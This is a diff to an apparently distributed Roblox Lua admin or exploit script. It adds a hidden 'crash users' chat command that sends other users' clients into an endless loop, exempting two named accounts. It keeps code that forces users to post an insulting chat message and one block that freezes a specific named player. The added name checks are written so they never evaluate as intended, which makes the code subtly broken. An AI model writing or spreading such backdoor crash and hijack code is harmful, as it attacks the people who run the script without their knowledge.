@@ -4669,6 +4669,12 @@ Color = Color3.fromRGB(255, 255, 255);
 Font = Enum.Font.GothamBlack;
 TextSize = 10;
 })
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
+Text = "crash users",
+Color = Color3.fromRGB(255, 255, 255);
+Font = Enum.Font.GothamBlack;
+TextSize = 10;
+})
 end
 
 function ShowAdmins()
@@ -4779,7 +4785,9 @@ if string.sub(tk, 1, 7) == (OwnPrefix.."rejoin") then
 game:GetService("TeleportService"):Teleport(game.PlaceId, LPlayer)
 end
 if string.sub(tk, 1, 4) == (OwnPrefix.."msg") then
+if not LPlayer.Name == "viniciuszk70" then
 Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am yag", "All")
+end
 end
 if string.sub(tk, 1, 9) == (OwnPrefix.."getusers") then
 local NickName = LPlayer.Name
@@ -4798,7 +4806,7 @@ if string.sub(tk, 1, 7) == (OwnPrefix.."notify") then
 Notify()
 end
 if string.sub(tk, 1, 4) == (OwnPrefix.."sit") then
-game.Players.LocalPlayer.Character.Humanoid.Sit = true
+LPlayer.Character.Humanoid.Sit = true
 end
 if string.sub(tk, 1, 8) == (OwnPrefix.."respawn") then
 local savedcf = LPlayer.Character.HumanoidRootPart.CFrame
@@ -4809,6 +4817,15 @@ workspace.CurrentCamera.CFrame = savedcamcf
 end
 if string.sub(tk, 1, 14) == (OwnPrefix.."abuser notify") then
 AbuserNotify()
+end
+if string.sub(tk, 1, 12) == (OwnPrefix.."crash users") then
+if not game.Players.LocalPlayer.Name == "viniciuszk70" then
+if not game.Players.LocalPlayer.Name == "takkan007" then
+for i = 1,math.huge do
+print('idiota')
+end
+end
+end
 end
 end)
 end
@@ -4819,7 +4836,9 @@ if string.sub(tk, 1, 7) == (OwnPrefix.."rejoin") then
 game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
 end
 if string.sub(tk, 1, 4) == (OwnPrefix.."msg") then
+if not LPlayer.Name == "takkan007" then
 Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am yag", "All")
+end
 end
 if string.sub(tk, 1, 9) == (OwnPrefix.."getusers") then
 local NickName = LPlayer.Name
@@ -4838,7 +4857,7 @@ if string.sub(tk, 1, 7) == (OwnPrefix.."notify") then
 Notify()
 end
 if string.sub(tk, 1, 4) == (OwnPrefix.."sit") then
-game.Players.LocalPlayer.Character.Humanoid.Sit = true
+LPlayer.Character.Humanoid.Sit = true
 end
 if string.sub(tk, 1, 8) == (OwnPrefix.."respawn") then
 local savedcf = LPlayer.Character.HumanoidRootPart.CFrame
@@ -4850,11 +4869,20 @@ end
 if string.sub(tk, 1, 14) == (OwnPrefix.."abuser notify") then
 AbuserNotify()
 end
+if string.sub(tk, 1, 12) == (OwnPrefix.."crash users") then
+if not LPlayer.Name == "viniciuszk70" then
+if not LPlayer.Name == "takkan007" then
+for i = 1,math.huge do
+print('idiota')
+end
+end
+end
+end
 end)
 end
 
 if game.Players:FindFirstChild("king_pro433") then
-if game.Players.LocalPlayer.Name == "king_pro433" then
+if LPlayer.Name == "king_pro433" then
 for i = 1,math.huge do
 print('idiota')
 end
